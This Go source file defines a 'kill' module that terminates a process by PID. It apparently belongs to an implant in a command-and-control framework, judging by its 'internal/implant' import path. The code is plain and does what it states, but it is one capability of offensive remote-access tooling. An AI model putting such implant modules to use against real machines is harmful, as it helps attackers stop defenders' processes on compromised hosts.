package kill

import (
	"fmt"
	"strconv"

	"github.com/r74tech/virga/internal/implant/logger"
)

// KillModule terminates processes by PID
type KillModule struct{}

// Name returns the module name
func (m *KillModule) Name() string {
	return "kill"
}

// Execute kills a process by PID
// args[0] should be the PID
func (m *KillModule) Execute(args []string) (string, int, error) {
	if len(args) == 0 {
		return "", 1, fmt.Errorf("kill requires PID argument")
	}

	pidStr := args[0]
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		return "", 1, fmt.Errorf("invalid PID: %s", pidStr)
	}

	// Validate PID
	if pid <= 0 {
		return "", 1, fmt.Errorf("invalid pid: %d", pid)
	}

	log := logger.Get()
	log.Debug("Kill module executing", map[string]interface{}{
		"pid": pid,
	})

	// Call platform-specific implementation
	err = killProcess(pid)
	if err != nil {
		log.LogCommand(fmt.Sprintf("kill %d", pid), "", 1, err)
		return fmt.Sprintf("Failed to kill process %d: %s", pid, err), 1, err
	}

	result := fmt.Sprintf("Successfully killed process %d", pid)
	log.LogCommand(fmt.Sprintf("kill %d", pid), result, 0, nil)
	return result, 0, nil
}
